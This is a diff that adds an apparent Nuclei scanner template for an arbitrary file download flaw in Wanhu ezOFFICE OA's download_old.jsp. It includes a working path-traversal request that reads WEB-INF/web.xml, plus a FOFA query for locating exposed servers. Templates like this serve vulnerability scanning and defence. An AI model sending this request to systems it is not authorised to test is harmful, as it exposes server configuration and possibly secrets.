@@ -1,0 +1,26 @@
+http:
+    - matchers:
+        - condition: and
+          dsl:
+            - status_code == 200 && contains((body), 'defaultroot')
+          type: dsl
+      method: GET
+      path:
+        - '{{RootURL}}/defaultroot/public/download/download_old.jsp;?path=..&name=web.xml&FileName=WEB-INF/web.xml'
+id: wanhu-ezoffice-download-jsp-filedownload
+info:
+    author: xiuxin
+    description: 万户ezOFFICE OA系统download.jsp存在任意文件下载漏洞
+    metadata:
+        fofa-query: app="万户网络-ezOFFICE"
+        max-request: 1
+        verified: true
+    name: 万户ezOFFICE OA系统download.jsp存在任意文件下载漏洞
+    reference:
+        - none
+    severity: high
+    tags:
+        - wanhu
+        - filedownload
+        - ezoffice
+        - 万户网络-ezOFFICE
